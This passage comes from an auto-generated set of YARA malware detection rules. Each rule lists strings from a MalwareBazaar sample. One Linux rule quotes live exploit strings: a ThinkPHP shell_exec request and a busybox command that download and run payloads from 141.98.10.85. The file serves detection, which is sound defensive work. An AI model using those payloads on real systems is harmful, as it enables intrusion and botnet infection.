        $s8 = "file not found"
        $s9 = "file stat failed"
        $s10 = "file open failed"
        $s11 = "file seek failed"
        $s12 = "write callback failed"
        $s13 = "file write failed"
        $s14 = "file create failed"
        $s15 = "file close failed"
        $s16 = "file read failed"
        $s17 = "Windows Vista"
        $s18 = "Windows Server 2008"
        $s19 = "Windows 8"
        $s20 = "Windows 7"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 394KB and
        all of them
}

rule Windows_ede93512a69d3d17e3e881f934c08df17bcd1855f872b674ad1c2480dda3e816
{
    meta:
        description = "Auto ML: ede93512a69d3d17e3e881f934c08df17bcd1855f872b674ad1c2480dda3e816"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4469KB and
        all of them
}

rule Linux_16c6939e58bf7f1431c6ea29cc30b221f4d1773d07baadfd15143d4b7becf081
{
    meta:
        description = "Auto ML: 16c6939e58bf7f1431c6ea29cc30b221f4d1773d07baadfd15143d4b7becf081"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "No such file or directory"
        $s2 = "No such process"
        $s3 = "Interrupted system call"
        $s4 = "Bad file descriptor"
        $s5 = "No child processes"
        $s6 = "Resource temporarily unavailable"
        $s7 = "File exists"
        $s8 = "Too many open files in system"
        $s9 = "Too many open files"
        $s10 = "Text file busy"
        $s11 = "File too large"
        $s12 = "Read-only file system"
        $s13 = "File name too long"
        $s14 = "Level 3 reset"
        $s15 = "Bad font file format"
        $s16 = "Multihop attempted"
        $s17 = "File descriptor in bad state"
        $s18 = "Attempting to link in too many shared libraries"
        $s19 = "Interrupted system call should be restarted"
        $s20 = "Too many users"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 200KB and
        all of them
}

rule Windows_ee360a49633521f9de9070d9494277fa2fc7246a9529c9a9b2125a40948d4a8e
{
    meta:
        description = "Auto ML: ee360a49633521f9de9070d9494277fa2fc7246a9529c9a9b2125a40948d4a8e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".text"
        $s4 = "`.rdata"
        $s5 = "@.data"
        $s6 = ".rsrc"
        $s7 = "kernel32.dll"
        $s8 = "WinINet.dll"
        $s9 = "wininet.dll"
        $s10 = "shlwapi.dll"
        $s11 = "advapi32.dll"
        $s12 = "user32.dll"
        $s13 = "oleaut32.dll"
        $s14 = "kernel32"
        $s15 = "user32"
        $s16 = "GetWindowsDirectoryA"
        $s17 = "CreateThread"
        $s18 = "TerminateThread"
        $s19 = "CloseHandle"
        $s20 = "InternetOpenA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1308KB and
        all of them
}

rule Linux_ee5ad4f256c89ac9dd9d96f384cabbe25a731835561f9741b1314d51f66a014a
{
    meta:
        description = "Auto ML: ee5ad4f256c89ac9dd9d96f384cabbe25a731835561f9741b1314d51f66a014a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB and
        all of them
}

rule Windows_ee7f176672fb6774c261d8eb419db32d66dcd350aebc465e34860d80eb573485
{
    meta:
        description = "Auto ML: ee7f176672fb6774c261d8eb419db32d66dcd350aebc465e34860d80eb573485"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "System.Runtime.CompilerServices"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Diagnostics"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "Remote.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{3912E512-C054-4C61-B0ED-58EC75084F79}"
        $s15 = "<Module>{0f91f2e8-1b27-4e54-91d9-8925b843e0a8}"
        $s16 = "get_Days"
        $s17 = "kernel32.dll"
        $s18 = "CreateRemoteThread"
        $s19 = "System.IO"
        $s20 = "get_Message"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 363KB and
        all of them
}

rule Windows_ee8623307bbea96542aa91b81601f9b4362cc474fa4257628f99e3bb087c3f4c
{
    meta:
        description = "Auto ML: ee8623307bbea96542aa91b81601f9b4362cc474fa4257628f99e3bb087c3f4c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System.Core"
        $s6 = "System"
        $s7 = "System.Diagnostics"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Reflection"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "TargetFrameworkAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "Gynae.exe"
        $s14 = "<Module>"
        $s15 = "SchemaReaderSql"
        $s16 = "UserExt"
        $s17 = "ProcessFileHandle"
        $s18 = "SYSTEM_HANDLE_INFORMATION"
        $s19 = "FileMapProtection"
        $s20 = "FileMapAccess"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 343KB and
        all of them
}

rule Linux_ee9b7c784a5edcae84b067e6fb6c9e171abae8114747c7deee8a91ff90da5ff2
{
    meta:
        description = "Auto ML: ee9b7c784a5edcae84b067e6fb6c9e171abae8114747c7deee8a91ff90da5ff2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://141.98.10.85/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://141.98.10.85/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = ".text"
        $s10 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 67KB and
        all of them
}

rule Windows_eea6c4cb7a9e580441c2a4c9debd6b143c9a06a68580c8666246975ea6af32cb
{
    meta:
        description = "Auto ML: eea6c4cb7a9e580441c2a4c9debd6b143c9a06a68580c8666246975ea6af32cb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6258KB and
        all of them
}

rule Windows_ef05c02e9a2ce2b6ed7c7d8e994c389383f357dc60da206560001f8978b19ead
{
    meta:
        description = "Auto ML: ef05c02e9a2ce2b6ed7c7d8e994c389383f357dc60da206560001f8978b19ead"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Linux_ef63306be89446e2924db9eb7e9a8dcaee3125d5125917957d935f6f528ac84c
{
    meta:
        description = "Auto ML: ef63306be89446e2924db9eb7e9a8dcaee3125d5125917957d935f6f528ac84c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "connect"
        $s2 = "sigemptyset"
        $s3 = "getpid"
        $s4 = "readlink"
        $s5 = "socket"
        $s6 = "readdir"
        $s7 = "sigaddset"
        $s8 = "write"
        $s9 = "setsockopt"
        $s10 = "read"
        $s11 = "memset"
        $s12 = "getppid"
        $s13 = "opendir"
        $s14 = "getsockopt"
        $s15 = "open"
        $s16 = "setsid"
        $s17 = "closedir"
        $s18 = "close"
        $s19 = "getsockname"
        $s20 = "HTTP/1.1"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 74KB and
        all of them
}

rule Linux_efcf32d9515a8d32926d27ac029a5b91ad482354bdba6396ce892810bec30e2f
{
    meta:
        description = "Auto ML: efcf32d9515a8d32926d27ac029a5b91ad482354bdba6396ce892810bec30e2f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "OpenSUSE"
        $s2 = "OpenWRT"
        $s3 = "No such file or directory"
        $s4 = "No such process"
        $s5 = "Interrupted system call"
        $s6 = "Bad file descriptor"
        $s7 = "No child processes"
        $s8 = "Resource temporarily unavailable"
        $s9 = "File exists"
        $s10 = "Too many open files in system"
        $s11 = "Too many open files"
        $s12 = "Text file busy"
        $s13 = "File too large"
        $s14 = "Read-only file system"
        $s15 = "File name too long"
        $s16 = "Level 3 reset"
        $s17 = "Bad font file format"
        $s18 = "Multihop attempted"
        $s19 = "File descriptor in bad state"
        $s20 = "Attempting to link in too many shared libraries"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 71KB and
        all of them
}

rule Windows_efe63a2db88d9166eb773f1c479a642b3d05494ade91263e53cd61f06e5d0d59
{
    meta:
        description = "Auto ML: efe63a2db88d9166eb773f1c479a642b3d05494ade91263e53cd61f06e5d0d59"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Wine builtin DLL"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = ".rsrc"
        $s6 = ".reloc"
        $s7 = "WINEDEBUG"
        $s8 = "__wine_dbg_get_channel_flags"
        $s9 = "__wine_dbg_strdup"
        $s10 = "__wine_dbg_output"
        $s11 = "__wine_dbg_header"
        $s12 = "GetModuleHandleW"
        $s13 = "GetProcAddress"
        $s14 = "GetTickCount"
        $s15 = "_get_initial_wide_environment"
        $s16 = "_set_app_type"
        $s17 = "fwrite"
        $s18 = "getenv"
        $s19 = "kernel32.dll"
        $s20 = "ntdll.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 52KB and
        all of them
}

rule Linux_171b6ee729d08135b26b3784bffd1de202717a543c5d8969d613be7a500c86aa
{
    meta:
        description = "Auto ML: 171b6ee729d08135b26b3784bffd1de202717a543c5d8969d613be7a500c86aa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB and
        all of them
}

rule Windows_f0164ec8c236a65046db19bb07dc24d20c7785bf1adc0823d89b568164dae9b0
{
    meta:
        description = "Auto ML: f0164ec8c236a65046db19bb07dc24d20c7785bf1adc0823d89b568164dae9b0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<System-Collections-Generic-IEnumerable<System-WindowsBitmap-Docking-AutoHideStripBase-Tab>-GetEnumerator>d__0"
        $s5 = "<System-Collections-Generic-IEnumerable<System-WindowsBitmap-Docking-DockPaneStripBase-Tab>-GetEnumerator>d__0"
        $s6 = "<System-Collections-IEnumerable-GetEnumerator>d__1"
        $s7 = "ReadOnlyCollection`1"
        $s8 = "get_DataTable1"
        $s9 = "get_DataColumn1"
        $s10 = "set_DataColumn1"
        $s11 = "get_DockPanel_Persistor_XmlFileComment1"
        $s12 = "<get_Documents>d__112"
        $s13 = "System.WindowsBitmap.Docking.Win32"
        $s14 = "ReadInt32"
        $s15 = "get_DockPanel_Persistor_XmlFileComment2"
        $s16 = "<System-Collections-Generic-IEnumerable<System-WindowsBitmap-Docking-AutoHideStripBase-Pane>-GetEnumerator>d__15"
        $s17 = "<System-Collections-IEnumerable-GetEnumerator>d__16"
        $s18 = "<Module>"
        $s19 = "System.Drawing.Drawing2D"
        $s20 = "WM_USERCHANGED"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 805KB and
        all of them
}

rule Windows_f062b66382f86660deaed4d0af191706f0d62432c9bd4f1bb75a2b292eed4f8b
{
    meta:
        description = "Auto ML: f062b66382f86660deaed4d0af191706f0d62432c9bd4f1bb75a2b292eed4f8b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "AssemblyKeyFileAttribute"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "System.Runtime.InteropServices"
        $s11 = "TargetFrameworkAttribute"
        $s12 = "System.Runtime.Versioning"
        $s13 = "nNbf.exe"
        $s14 = "<Module>"
        $s15 = "System.Windows.Forms"
        $s16 = "Settings"
        $s17 = "ApplicationSettingsBase"
        $s18 = "System.Configuration"
        $s19 = "<Module>{5E282759-56BD-474E-AF5A-1450291C388C}"
        $s20 = "System.ComponentModel"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 858KB and
        all of them
}

rule Windows_f08afadff8298941a488a237df4deb8f94f13bf274411548f386d2828f4df636
{
    meta:
        description = "Auto ML: f08afadff8298941a488a237df4deb8f94f13bf274411548f386d2828f4df636"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "GetNativeSystemInf"
        $s3 = "V-.kernel32.dl%"
        $s4 = "LoadA5Ad("
        $s5 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" language=\"*\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\"/>"
        $s6 = "KERNEL32.DLL"
        $s7 = "ADVAPI32.dll"
        $s8 = "COMCTL32.dll"
        $s9 = "COMDLG32.dll"
        $s10 = "IPHLPAPI.DLL"
        $s11 = "OLEAUT32.dll"
        $s12 = "PSAPI.DLL"
        $s13 = "SHELL32.dll"
        $s14 = "USER32.dll"
        $s15 = "USERENV.dll"
        $s16 = "UxTheme.dll"
        $s17 = "VERSION.dll"
        $s18 = "WININET.dll"
        $s19 = "WINMM.dll"
        $s20 = "WSOCK32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 665KB and
        all of them
}

rule Linux_f09fee162d20a6465d89d6973195773d235a9518501676d56c2d6be54aefcfff
{
    meta:
        description = "Auto ML: f09fee162d20a6465d89d6973195773d235a9518501676d56c2d6be54aefcfff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "OpenSUSE"
        $s2 = "OpenWRT"
        $s3 = "No such file or directory"
        $s4 = "No such process"
        $s5 = "Interrupted system call"
        $s6 = "Bad file descriptor"
        $s7 = "No child processes"
        $s8 = "Resource temporarily unavailable"
        $s9 = "File exists"
        $s10 = "Too many open files in system"
        $s11 = "Too many open files"
        $s12 = "Text file busy"
        $s13 = "File too large"
        $s14 = "Read-only file system"
        $s15 = "File name too long"
        $s16 = "Level 3 reset"
        $s17 = "Bad font file format"
        $s18 = "Multihop attempted"
        $s19 = "File descriptor in bad state"
        $s20 = "Attempting to link in too many shared libraries"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 67KB and
        all of them
}

rule Windows_f0dee3431ba080ec1fd1975882ae347be81cbb21a81e64ffdf6cc41e14b42fa6
{
    meta:
        description = "Auto ML: f0dee3431ba080ec1fd1975882ae347be81cbb21a81e64ffdf6cc41e14b42fa6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Xwiliznr.exe"
        $s5 = "<Module>"
        $s6 = "TouchSocket.Composer"
        $s7 = "System"
        $s8 = "TouchSocket.Messages"
        $s9 = "ConsumerSystemStructBuilder"
        $s10 = "IsReadOnlyAttribute"
        $s11 = "System.Runtime.CompilerServices"
        $s12 = "TouchSocket.Records"
        $s13 = "WriterWrapperPolicy`1"
        $s14 = "TouchSocket.Polices"
        $s15 = "TouchSocket.Consumers"
        $s16 = "TouchSocket.Instances"
        $s17 = "DefinitionConnectionVisitor"
        $s18 = "TouchSocket.Visitors"
        $s19 = "ParamsConnectionVisitor"
        $s20 = "TouchSocket.Authentication"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2017KB and
        all of them
}

rule Windows_f12734aeb802ff0928b8ea0297d79d69eb30e93855612d63ca174986384b7311
{
    meta:
        description = "Auto ML: f12734aeb802ff0928b8ea0297d79d69eb30e93855612d63ca174986384b7311"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2993KB and
        all of them
}

rule Windows_f146915a0298daff26ffe85a42b9a9ef68e7a148e3dbe3bc43abb283d96facbd
{
    meta:
        description = "Auto ML: f146915a0298daff26ffe85a42b9a9ef68e7a148e3dbe3bc43abb283d96facbd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "WNetCloseEnum"
        $s6 = "WNetOpenEnumW"
        $s7 = "WNetUseConnectionW"
        $s8 = "GetIpAddrTable"
        $s9 = "IPHLPAPI.DLL"
        $s10 = "WinHttpReceiveResponse"
        $s11 = "WinHttpSendRequest"
        $s12 = "WinHttpConnect"
        $s13 = "WinHttpCloseHandle"
        $s14 = "WinHttpOpen"
        $s15 = "WinHttpOpenRequest"
        $s16 = "WINHTTP.dll"
        $s17 = "ExitProcess"
        $s18 = "SetFilePointer"
        $s19 = "GetComputerNameW"
        $s20 = "SetEvent"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 56KB and
        all of them
}

rule Windows_f150f98d8db9547e50591b84478d2c815b43515f160dbc2f55332c27a2474e70
{
    meta:
        description = "Auto ML: f150f98d8db9547e50591b84478d2c815b43515f160dbc2f55332c27a2474e70"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<File>j__TPar"
        $s5 = "Created"
        $s6 = "Deleted"
        $s7 = "DateTimeOffset"
        $s8 = "<DefaultSettings>k__BackingField"
        $s9 = "<WriteData>k__BackingField"
        $s10 = "<ReadData>k__BackingField"
        $s11 = "<CloseInput>k__BackingField"
        $s12 = "_traceWriter"
        $s13 = "_maxDepthSet"
        $s14 = "_dateFormatStringSet"
        $s15 = "<TraceWriter>k__BackingField"
        $s16 = "_reader"
        $s17 = "_isEndOfFile"
        $s18 = "Read"
        $s19 = "ReadAsInt32"
        $s20 = "ReadAsInt64"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1296KB and
        all of them
}

rule Windows_f17f41323edce0c031d30cb3806fff82a7adb07cbd653e93316eab84b05fcb7f
{
    meta:
        description = "Auto ML: f17f41323edce0c031d30cb3806fff82a7adb07cbd653e93316eab84b05fcb7f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3193KB and
        all of them
}

rule Windows_f1ba0000ca5e3000165e46e43d0b254f6935bd93feb32be64fa57f05732c5548
{
    meta:
        description = "Auto ML: f1ba0000ca5e3000165e46e43d0b254f6935bd93feb32be64fa57f05732c5548"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = ">AkCmD0@eZ6,0J"
        $s5 = ">AkCmD0@eZ"
        $s6 = "7FkCmD0@"
        $s7 = "kIXOsEtUkP`qa}*airxQ69SF@e|"
        $s8 = "tf,QH7)=xhYAyYRQ]Cmds"
        $s9 = "System.IO"
        $s10 = "System.Collections.Generic"
        $s11 = "add_Load"
        $s12 = "get_IndianRed"
        $s13 = "get_Enabled"
        $s14 = "set_Enabled"
        $s15 = "set_FormattingEnabled"
        $s16 = "get_IsCompleted"
        $s17 = "get_highSchoolGrade"
        $s18 = "set_highSchoolGrade"
        $s19 = "set_AutoScaleMode"
        $s20 = "set_ColumnHeadersHeightSizeMode"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1306KB and
        all of them
}

rule Windows_01e57bfd68aaf8de3af7e865c815a2e88b01174a7ae2856928ff1e10391bed9a
{
    meta:
        description = "Auto ML: 01e57bfd68aaf8de3af7e865c815a2e88b01174a7ae2856928ff1e10391bed9a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SetDllDirectoryW"
        $s7 = "SetDefaultDllDirectories"
        $s8 = "map/set too long"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2395KB and
        all of them
}

rule Windows_1730345fea7a9812b05c73cc2fe4791597f87d7ed40018c127c94f7066173353
{
    meta:
        description = "Auto ML: 1730345fea7a9812b05c73cc2fe4791597f87d7ed40018c127c94f7066173353"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1162KB and
        all of them
}

rule Windows_f22e8c6027000f421c70d5733ff537d1e2e49deb5cc1d6ad3287175dffc2668e
{
    meta:
        description = "Auto ML: f22e8c6027000f421c70d5733ff537d1e2e49deb5cc1d6ad3287175dffc2668e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 207KB and
        all of them
}

rule Windows_f28ca289207dfe7c79f3eca130f2a340bbc260c9818b5f5d7b94a3304a9fd4b1
{
    meta:
        description = "Auto ML: f28ca289207dfe7c79f3eca130f2a340bbc260c9818b5f5d7b94a3304a9fd4b1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "sPsEtPs&HPs?"
        $s6 = "PsetPs"
        $s7 = "C:\\Program Files\\Microsoft Visual Studio\\VB98\\VB6.OLB"
        $s8 = "winspool.drv"
        $s9 = "ClosePrinter"
